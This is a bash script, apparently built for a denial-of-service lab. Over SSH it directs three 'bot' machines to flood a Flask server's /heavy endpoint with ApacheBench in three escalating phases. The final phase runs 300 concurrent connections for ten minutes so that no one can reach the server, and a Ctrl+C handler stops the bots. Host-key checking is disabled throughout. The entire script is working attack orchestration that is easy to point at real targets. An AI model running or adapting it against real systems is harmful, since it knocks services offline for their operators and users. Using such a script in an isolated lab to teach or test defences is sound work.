#!/bin/bash

SERVER_IP="<SERVER_EXTERNAL_IP>"  # ← Change to your server's static external IP
BOT1="<BOT1_INTERNAL_IP>"   # ← Change to ddos-bot-1 internal IP
BOT2="<BOT2_INTERNAL_IP>"   # ← Change to ddos-bot-2 internal IP
BOT3="<BOT3_INTERNAL_IP>"   # ← Change to ddos-bot-3 internal IP
KEY="$HOME/.ssh/botkey"

stop_all() {
    echo ""
    echo "==============================="
    echo "Stopping all bots..."
    ssh -i $KEY -o StrictHostKeyChecking=no $BOT1 \
      "sudo pkill -9 ab; sudo pkill -9 bash" 2>/dev/null
    echo "  Bot-1 stopped"
    ssh -i $KEY -o StrictHostKeyChecking=no $BOT2 \
      "sudo pkill -9 ab; sudo pkill -9 bash" 2>/dev/null
    echo "  Bot-2 stopped"
    ssh -i $KEY -o StrictHostKeyChecking=no $BOT3 \
      "sudo pkill -9 ab; sudo pkill -9 bash" 2>/dev/null
    echo "  Bot-3 stopped"
    echo "  ✅ Done — server will recover in ~10s"
    echo "==============================="
    exit 0
}

trap stop_all INT TERM

echo "================================"
echo " DDoS LAB — FLASK APP ATTACK"
echo "================================"
echo "Target:  http://$SERVER_IP/heavy"
echo "Flask:   3 workers total"
echo "Press Ctrl+C to stop"
echo ""

# Kill any leftover ab from previous run
echo "Cleaning up previous runs..."
for BOT in $BOT1 $BOT2 $BOT3; do
    ssh -i $KEY -o StrictHostKeyChecking=no $BOT \
      "sudo pkill -9 ab 2>/dev/null; true" &
done
wait
sleep 2
echo "Clean ✅"
echo ""

# Phase 1
echo "[$(date +%H:%M:%S)] PHASE 1 — Low traffic (9 concurrent)"
echo "                   Phone works fine..."
for BOT in $BOT1 $BOT2 $BOT3; do
    ssh -i $KEY -o StrictHostKeyChecking=no $BOT \
      "ab -n 999999 -c 3 -t 30 \
       http://$SERVER_IP/heavy > /tmp/attack.log 2>&1" &
done
wait
echo "[$(date +%H:%M:%S)] Phase 1 done"
echo ""

# Phase 2
echo "[$(date +%H:%M:%S)] PHASE 2 — Medium flood (30 concurrent)"
echo "                   Phone getting slow..."
for BOT in $BOT1 $BOT2 $BOT3; do
    ssh -i $KEY -o StrictHostKeyChecking=no $BOT \
      "ab -n 999999 -c 10 -t 30 \
       http://$SERVER_IP/heavy > /tmp/attack.log 2>&1" &
done
wait
echo "[$(date +%H:%M:%S)] Phase 2 done"
echo ""

# Phase 3 — NO while true, just long duration ab
echo "[$(date +%H:%M:%S)] PHASE 3 — FULL FLOOD (300 concurrent)"
echo "                   NOBODY can reach server"
echo "                   Press Ctrl+C to stop"
echo ""
for BOT in $BOT1 $BOT2 $BOT3; do
    ssh -i $KEY -o StrictHostKeyChecking=no $BOT \
      "ab -n 9999999 -c 100 -t 600 \
       http://$SERVER_IP/heavy > /tmp/attack.log 2>&1" &
done
wait
